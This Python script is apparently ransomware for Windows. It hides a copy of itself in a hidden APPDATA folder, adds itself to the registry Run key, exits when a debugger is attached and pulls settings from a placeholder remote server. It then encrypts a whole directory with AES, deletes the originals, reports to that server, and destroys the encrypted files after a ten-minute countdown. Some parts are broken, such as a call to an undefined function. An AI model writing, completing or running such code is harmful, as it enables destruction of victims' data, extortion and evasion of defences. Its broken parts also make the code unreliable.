import os
import sys
import ctypes
import shutil
import logging
import platform
import requests
import threading
import time
import winreg as reg
import hashlib
import tkinter as tk
from tkinter import simpledialog, messagebox, filedialog
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256

# Setup logging
logging.basicConfig(filename=os.path.join(os.getenv('APPDATA'), 'hidden_log.log'), level=logging.INFO, format='%(asctime)s %(message)s')

# Disguise the process
def disguise_process():
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    pid = os.getpid()
    kernel32.SetConsoleTitleW(f"System Process {pid}")

disguise_process()

# Hide the script
def hide_script():
    hidden_dir = os.path.join(os.getenv('APPDATA'), 'SystemCache')
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
    
    script_path = os.path.abspath(__file__)
    hidden_path = os.path.join(hidden_dir, os.path.basename(script_path))
    if script_path != hidden_path:
        shutil.copy2(script_path, hidden_path)
        os.system(f'attrib +h {hidden_path}')
        os.system(f'attrib +h {hidden_dir}')

    return hidden_path

script_path = hide_script()

# Ensure persistence
def add_to_startup(file_path):
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open_key, "SystemCacheUpdater", 0, reg.REG_SZ, file_path)
    reg.CloseKey(open_key)

add_to_startup(script_path)

# Anti-debugging
def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

if is_debugger_present():
    sys.exit()

# Check OS version
def check_os_version():
    version = platform.version()
    if "10" in version:
        return "Windows 10"
    elif "6.3" in version:
        return "Windows 8.1"
    elif "6.2" in version:
        return "Windows 8"
    elif "6.1" in version:
        return "Windows 7"
    else:
        return "Unsupported OS"

os_version = check_os_version()
if os_version == "Unsupported OS":
    sys.exit("Unsupported OS")

# Fetch dynamic configuration
def fetch_config():
    url = "http://your-server.com/config"
    try:
        response = requests.get(url)
        return response.json()
    except Exception as e:
        logging.error(f"Error fetching config: {e}")
        return None

config = fetch_config()
if config:
    key = config.get('encryption_key', b'default_key_123456')
else:
    key = b'default_key_123456'

# Derive encryption key
def derive_key(password):
    salt = b'some_salt'
    key = PBKDF2(password, salt, dkLen=32, count=1000000, hmac_hash_module=SHA256)
    return key

password = simpledialog.askstring("Input", "Enter the encryption password:", show='*')
key = derive_key(password)

# Encryption and decryption functions
def calculate_hash(data):
    sha256 = hashlib.sha256()
    sha256.update(data)
    return sha256.hexdigest()

def verify_data_integrity(original_data, decrypted_data):
    original_hash = calculate_hash(original_data)
    decrypted_hash = calculate_hash(decrypted_data)
    return original_hash == decrypted_hash

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        nonce = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        with open(file_path + '.enc', 'wb') as f:
            for x in (nonce, tag, ciphertext):
                f.write(x)
        
        os.remove(file_path)
        logging.info(f"Encrypted {file_path}")
    except Exception as e:
        logging.error(f"Error encrypting {file_path}: {e}")

def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            nonce, tag, ciphertext = [f.read(x) for x in (12, 16, -1)]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)

        with open(file_path[:-4], 'wb') as f:
            f.write(data)
        
        os.remove(file_path)
        logging.info(f"Decrypted {file_path}")

        # Verify data integrity
        original_data = get_original_data(file_path)
        if not verify_data_integrity(original_data, data):
            logging.error(f"Data integrity check failed for {file_path}")
    except Exception as e:
        logging.error(f"Error decrypting {file_path}: {e}")

def count_all_files(directory):
    total_files = 0
    for root, dirs, files in os.walk(directory):
        total_files += len(files)
    return total_files

def update_progress(total_files, encrypted_files):
    progress_message = f"Encrypting file {encrypted_files} of {total_files}"
    message_label.config(text=progress_message)
    root.update_idletasks()

def encrypt_all_files(directory, key):
    total_files = count_all_files(directory)
    encrypted_files = 0

    def encrypt_worker(files):
        nonlocal encrypted_files
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
            encrypted_files += 1
            update_progress(total_files, encrypted_files)
    
    threads = []
    for root, dirs, files in os.walk(directory):
        t = threading.Thread(target=encrypt_worker, args=(files,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    messagebox.showinfo("Info", "Encryption completed")
    send_log_to_server("Encryption completed")

def decrypt_all_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.enc'):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)

def send_log_to_server(log):
    url = "http://your-server.com/log"
    payload = {"log": log}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        logging.error(f"Error sending log: {e}")

def select_path():
    path = filedialog.askdirectory()
    if path:
        return path
    else:
        messagebox.showerror("Error", "No directory selected")
        sys.exit()

def countdown_timer(duration, directory):
    for i in range(duration, 0, -1):
        print(f"Time remaining: {i} seconds", end='\r')
        time.sleep(1)
    # If time is up, delete all encrypted files
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.enc'):
                os.remove(os.path.join(root, file))
    messagebox.showinfo("Info", "Time is up! All encrypted files have been deleted.")

def main():
    key = derive_key(password)
    if len(key) not in [16, 24, 32]:
        logging.error("Error: Key must be 16, 24, or 32 bytes long")
        return

    global root, message_label
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    progress_window = tk.Toplevel(root)
    progress_window.title("Progress")
    message_label = tk.Label(progress_window, text="Starting encryption...")
    message_label.pack(pady=20, padx=20)

    path = select_path()
    root.after(100, encrypt_all_files, path, key)  # Start the encryption after the window is created
    root.mainloop()

    # Start the countdown timer
    countdown_duration = 600  # 10 minutes
    countdown_thread = threading.Thread(target=countdown_timer, args=(countdown_duration, path))
    countdown_thread.start()

    messagebox.showinfo("Info", "All files have been encrypted. Enter the decryption key to decrypt.")
    
    decryption_key = simpledialog.askstring("Input", "Give me the decryption key:", show='*')
    if decryption_key:
        decryption_key = derive_key(decryption_key)
        decrypt_all_files(path, decryption_key)
    else:
        messagebox.showerror("Error", "Invalid decryption key.")

if __name__ == "__main__":
    main()
